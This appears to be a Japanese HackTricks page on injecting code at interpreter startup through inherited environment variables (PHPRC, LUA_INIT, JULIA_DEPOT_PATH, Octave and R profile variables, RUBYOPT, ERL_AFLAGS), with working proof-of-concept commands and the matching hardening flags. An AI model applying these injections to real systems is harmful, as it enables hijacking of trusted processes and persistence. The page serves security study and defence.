# 環境変数を介した macOS Interpreter の起動時インジェクション

{{#include ../../../banners/hacktricks-training.md}}

これらのランタイム固有の手法では、継承された環境変数を使って、意図されたワークロードの実行前に起動設定を選択したり、コードを preload したり、VM フラグを指定したりします。一部の手法ではファイルを使用しますが、Lua と Erlang ではインラインコードの実行にも対応しています。

## PHP の起動設定

### `PHPRC` / `PHP_INI_SCAN_DIR` と `auto_prepend_file`

PHP CLI と CGI は、起動のたびに設定を読み込みます。`PHPRC` で攻撃者が読み取り可能な `php.ini` を指定でき、`PHP_INI_SCAN_DIR` で追加の `.ini` ファイルをスキャンするディレクトリを変更できます。`auto_prepend_file` ディレクティブを使うと、PHP は要求されたスクリプトより前にファイルを解析するため、この組み合わせによって起動時のコード実行が可能になります。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

別の方法として、`.ini` ファイルを含むディレクトリがあります。

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` オプションは `php.ini` を無視します。信頼できるパスを明示した `-c` は `PHPRC` より優先されます。長時間稼働するサーバー SAPI は通常、Web サーバーの起動時に設定を読み込む一方、CLI と CGI は呼び出しごとに読み込む点に注意してください。<sup>[[1]](#references)</sup>

## Lua startup code

### `LUA_INIT`

コマンドラインオプションまたは対象スクリプトの処理前に、スタンドアロンの Lua インタープリターは `LUA_INIT_<major>_<minor>` を実行します。この変数が設定されていない場合は、代わりに `LUA_INIT` を実行します。値が `@` で始まる場合はファイル名として扱われ、それ以外の値は Lua コードとして直接評価されます。これにより、ファイルを使った起動時実行と、ファイルを使わない起動時実行の両方が可能になります。<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

インタープリターによって、正確なバージョン付きの名前は変わります。たとえば `LUA_INIT_5_4` です。`lua -E` は、起動コードや Lua のモジュールパスを含むすべての環境変数を無視します。

## Julia の startup depot

### `JULIA_DEPOT_PATH` と `startup.jl`

Julia は通常、起動時に最初の depot にある `config/startup.jl` を実行します。`JULIA_DEPOT_PATH` は depot の一覧を制御するため、攻撃者が読み取れるツリーを指定すると、自動的に読み込まれる startup file をリダイレクトできます。<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

末尾の区切り文字は、被害者が通常のパッケージを引き続き必要とする場合に便利です。`julia --startup-file=no` を指定すると、この startup file が無効になります。この変数はパッケージレジストリ、環境、キャッシュ、コードの読み込み場所も制御するため、起動前にクリアしてください。

## GNU Octave startup files

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave は起動時に、有効な Octave コマンドを含む複数のファイルを実行します。`OCTAVE_SITE_INITFILE` はサイト全体の startup file を上書きし、`OCTAVE_VERSION_INITFILE` はバージョン固有の startup file を上書きします。そのため、どちらの変数でも自動実行先を攻撃者が読み取り可能なファイルに変更できます。<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` は `~/.octaverc` などのユーザーファイルをスキップするだけで、上記の site-file の上書きは防ぎません。site files には `--no-site-file` を使い、すべての startup files を無効にするには `--norc` / `-f` を使います。<sup>[[7]](#references)</sup>

## R の起動プロファイルとパッケージの読み込み

### `R_PROFILE_USER` / `R_PROFILE`

起動時に R は、R コードを含む site および user のプロファイルファイルを読み込みます。`R_PROFILE` は site profile を指定し、`R_PROFILE_USER` は user profile を指定するため、継承された環境変数によって、いずれかの参照先を攻撃者が読み取り可能なファイルに変更できます。<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` はユーザープロファイルをスキップし、`--no-site-file` はサイトプロファイルをスキップします。`--vanilla` は両方の保護を適用します。R はまず `R_ENVIRON` と `R_ENVIRON_USER` で指定された環境ファイルを処理しますが、それらのファイルで設定できるのは変数のみです。任意コード実行の直接的な手段となるのはプロファイル変数です。

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` とライブラリパス

R は起動時に、`R_DEFAULT_PACKAGES` で指定されたカンマ区切りのパッケージをアタッチします。`Rscript` では `R_SCRIPT_DEFAULT_PACKAGES` が優先されます。これらの変数のいずれかを `R_LIBS`、`R_LIBS_USER`、または `R_LIBS_SITE` と組み合わせると、R が攻撃者の管理するインストール済みパッケージを検索してロードする可能性があります。その `.onLoad` または `.onAttach` フックは自動的に実行されます。<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

これは、単なる `.R` ファイルではなく、構造的に有効なインストール済み R package を必要とします。`--vanilla` は直接継承された変数をクリアしないため、信頼できる wrapper は profile ファイルを無効化するだけでなく、default-package および library-path 変数も unset または置き換える必要があります。

## Ruby loader options

### RUBYOPT

Ruby はスクリプトを実行する前に、`RUBYOPT` 環境変数からサポートされているコマンドラインスイッチを解析します。Ruby は `RUBYOPT` 内での `-e` によるコード実行を拒否しますが、`-I` はライブラリ検索ディレクトリを先頭に追加でき、`-r` はライブラリを require できます。そのため、攻撃者が制御する環境変数を使って Ruby を起動するプロセスにより、攻撃者が制御する Ruby code を読み込ませることができます。<sup>[[10]](#references)</sup>

`/tmp/inject.rb` を作成します：

```ruby:inject.rb
puts `whoami`
```

無害な Ruby スクリプト（`hello.rb` など）を作成します。:

```ruby:hello.rb
puts 'Hello, World!'
```

制御された `RUBYOPT` の値を指定して実行します:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

この動作を無効にするには、スクリプト名の**前に** `--disable=rubyopt`（または `--disable-rubyopt`）を指定します:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

`hello.rb` の後に記述されたオプションはスクリプトに `ARGV` として渡されますが、Ruby がそれ以前に行う `RUBYOPT` の処理を無効にはしません。<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

`RUBYOPT` 内で `-I` を使って load ディレクトリを先頭に追加する代わりに、別の環境変数 `RUBYLIB` を使うと、ディレクトリを Ruby の `$LOAD_PATH` に追加できます。`RUBYOPT=-r<module>` と組み合わせると、`RUBYOPT` 内で `-I` を使わずに attacker code を読み込めます:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Erlang and Elixir VMフラグ

### `ERL_AFLAGS`、`ERL_FLAGS`、`ERL_ZFLAGS`

`erl`ランチャーは`ERL_AFLAGS`をコマンドラインの先頭に追加し、`ERL_FLAGS` / `ERL_ZFLAGS`を末尾に追加します。`-eval`はVMの初期化中にErlang式を評価するため、これらの変数を使うと、想定されたワークロードが実行される前にfileless code executionを実現できます。<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir、Mix、Phoenix、および多くのElixirリリースは最終的にErlang VMを起動するため、これらのフラグを引き継ぐ可能性があります。正確なリリースラッパーを確認してください。VM引数を再構築またはサニタイズする場合がある一方、一部のツールは`ERL_AFLAGS`、`ERL_ZFLAGS`、または`ELIXIR_ERL_OPTIONS`を明示的にサポートしています。<sup>[[12]](#references)</sup>

ほとんどのファイルベースの手法とは異なり、`-eval`ペイロードには攻撃者が制御するファイルは必要ありません。信頼できるラッパーは、ランタイムの起動前に3つのErlangフラグ変数すべて（Elixirの場合は`ELIXIR_ERL_OPTIONS`も）をクリアする必要があります。パーサーと処理順序を完全に理解していない限り、個々のVMフラグを許可リストに登録しようとしないでください。

## References

- [1] [PHP設定ファイル](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHPの`auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4スタンドアロンインタープリター](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Juliaコマンドラインインターフェース: スタートアップファイル](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia環境変数: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octaveのスタートアップファイル](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octaveのコマンドラインオプション](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Rセッション開始時の初期化](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Rのインストールと管理: アドオンパッケージ](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Rubyドキュメント - Rubyコマンドラインオプション](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [`erl`コマンドと環境変数](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [ElixirリリースとVM環境オプション](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
